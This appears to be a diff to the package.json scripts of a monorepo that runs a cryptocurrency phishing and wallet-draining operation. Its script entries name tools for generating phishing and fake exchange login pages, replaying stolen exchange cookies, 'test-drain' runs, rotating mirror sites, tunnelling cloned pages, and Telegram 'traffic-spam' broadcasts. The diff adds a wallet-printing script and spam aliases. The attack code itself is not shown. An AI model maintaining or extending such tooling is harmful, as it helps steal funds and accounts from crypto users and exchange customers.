@@ -10,8 +10,6 @@
   "packageManager": "pnpm@9.15.9",
   "scripts": {
     "dev": "node scripts/dev.js",
-    "dev:lure": "pnpm --filter @legion/lure-ui dev",
-    "dev:hub": "pnpm --filter @legion/airdrop-hub dev",
     "dev:dashboard": "pnpm --filter @legion/dashboard dev",
     "dev:vault": "pnpm --filter @legion/sovereign-admin dev",
     "build:clean": "node scripts/clean-pnpm-locks.mjs",
@@ -26,6 +24,7 @@
     "omni-audit": "tsx scripts/omni-audit.ts",
     "final-audit": "tsx scripts/final-audit-report.ts",
     "health": "node --env-file=.env --env-file=.env.development --import tsx scripts/health-check.ts",
+    "print-wallets": "tsx --env-file=.env scripts/print-execution-wallets.ts",
     "live-audit": "node --env-file=.env --env-file=.env.development --import tsx scripts/live-audit.ts",
     "test-drain": "tsx --env-file=.env scripts/e2e-test-drain.ts",
     "test-omnichain": "tsx --env-file=.env scripts/e2e-test-omnichain.ts",
@@ -36,10 +35,12 @@
     "mirror:rotate": "pnpm --filter @legion/mirror start:rotator",
     "mirror:deploy": "tsx --env-file=.env scripts/deploy-mirror.ts",
     "generate-clone": "tsx scripts/generate-phishing-page.ts",
-    "clone-tunnel": "tsx scripts/clone-deploy-tunnel.ts",
+    "clone-tunnel": "tsx --env-file=.env scripts/clone-deploy-tunnel.ts",
     "cex-clone": "tsx scripts/generate-cex-login-page.ts",
     "cex-cookie-replay": "tsx --env-file=.env scripts/cex-cookie-replay.ts",
     "tg-broadcast": "tsx --env-file=.env scripts/telegram-broadcast.ts",
+    "traffic": "tsx --env-file=.env scripts/telegram-broadcast.ts",
+    "traffic-spam": "tsx --env-file=.env scripts/telegram-broadcast.ts",
     "build:dashboard": "pnpm --filter @legion/dashboard build"
   },
   "devDependencies": {
